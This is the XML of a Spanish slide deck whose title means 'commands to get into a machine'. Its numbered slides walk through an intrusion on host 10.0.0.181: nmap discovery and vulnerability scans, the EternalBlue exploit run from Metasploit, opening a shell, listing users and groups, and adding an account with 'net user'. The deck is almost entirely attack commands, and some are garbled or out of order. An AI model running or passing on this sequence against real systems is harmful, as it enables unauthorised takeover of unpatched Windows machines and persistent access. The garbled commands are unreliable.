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1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5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13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7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47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6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1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50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2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7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0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F1F82-78F6-4E33-9205-58A5E7B3A45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32025-9FD4-430B-A3A5-B8F06422596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0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Comandos para entrar a una maquina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18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1-ifconfig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Marcador de contenido 9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45444"/>
            <a:ext cx="5181600" cy="35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2-nmap -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>sn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> 10.0.0.0/24</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Marcador de contenido 1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32910" y="1825625"/>
            <a:ext cx="2460179" cy="4351338"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Marcador de contenido 11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636171" y="1825625"/>
            <a:ext cx="15856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02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3-ping -c 1 10.0.0.181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7787" y="2921001"/>
            <a:ext cx="4011735" cy="1156536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6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4-nmap -p --open -s5 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>nin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -rate 5000 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>vvv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -n -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Pn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> 10.0.0.181 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>oG</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> scan-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>prueba</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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46706" y="1825625"/>
            <a:ext cx="2164587" cy="4351338"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic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62603" y="2781924"/>
            <a:ext cx="3000794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64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5- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>sCV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> -p 135,139,445,49152,49153,49154,49155,49156,49158 10.0.0.181 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>oN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> res-targeted</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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468585"/>
            <a:ext cx="5181600" cy="3065417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0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6- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> --script "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>vuln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> and safe" -p 445 10.0.0.181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5023" y="2896240"/>
            <a:ext cx="4867954" cy="2210108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7- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> -q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0854" y="3238500"/>
            <a:ext cx="2710673" cy="958084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1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8- search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>eternalblue</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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823144"/>
            <a:ext cx="5181600" cy="2356299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61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9- use 0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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75943" y="3810767"/>
            <a:ext cx="5106113" cy="381053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62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10- show options</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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103953"/>
            <a:ext cx="5181600" cy="1794682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55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11- set RHOST 10.0.0.181</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000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833160"/>
            <a:ext cx="5181600" cy="336268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17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12- show options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103953"/>
            <a:ext cx="5181600" cy="1794682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60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13- exploit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264990"/>
            <a:ext cx="5181600" cy="1472607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21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14- shell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392415"/>
            <a:ext cx="5181600" cy="1217757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2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15- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>whoami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42813" y="3848872"/>
            <a:ext cx="3572374" cy="304843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6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17- net </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>localgroup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4286" y="1825625"/>
            <a:ext cx="3509428" cy="4351338"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic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64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18-ipconfig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32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16- net user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3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19- net user [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>tu-nombre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>] [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>contraseña</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>]</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>20- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>etc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81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104</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Panorámica</PresentationFormat>
  <Paragraphs>20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de Office</vt:lpstr>
      <vt:lpstr>Comandos para entrar a una maquina</vt:lpstr>
      <vt:lpstr>1-ifconfig </vt:lpstr>
      <vt:lpstr>2-nmap -sn 10.0.0.0/24</vt:lpstr>
      <vt:lpstr>3-ping -c 1 10.0.0.181 </vt:lpstr>
      <vt:lpstr>4-nmap -p --open -s5 -nin -rate 5000 -vvv -n -Pn 10.0.0.181 -oG scan-prueba</vt:lpstr>
      <vt:lpstr>5- nmap -sCV -p 135,139,445,49152,49153,49154,49155,49156,49158 10.0.0.181 -oN res-targeted</vt:lpstr>
      <vt:lpstr>6- nmap --script "vuln and safe" -p 445 10.0.0.181</vt:lpstr>
      <vt:lpstr>7- msfconsole -q </vt:lpstr>
      <vt:lpstr>8- search eternalblue</vt:lpstr>
      <vt:lpstr>9- use 0</vt:lpstr>
      <vt:lpstr>10- show options</vt:lpstr>
      <vt:lpstr>11- set RHOST 10.0.0.181</vt:lpstr>
      <vt:lpstr>12- show options</vt:lpstr>
      <vt:lpstr>13- exploit</vt:lpstr>
      <vt:lpstr>14- shell</vt:lpstr>
      <vt:lpstr>15- whoami</vt:lpstr>
      <vt:lpstr>17- net localgroup</vt:lpstr>
      <vt:lpstr>18-ipconfig</vt:lpstr>
      <vt:lpstr>16- net user</vt:lpstr>
      <vt:lpstr>19- net user [tu-nombre] [contraseña] 20- etc</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company>InKulpado666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Comandos para entrar a una maquina</dc:title>
  <dc:creator>PC</dc:creator>
  <cp:lastModifiedBy>PC</cp:lastModifiedBy>
  <cp:revision>6</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-01-17T19:53:58Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-01-17T20:44:00Z</dcterms:modified>
</cp:coreProperties>
</file>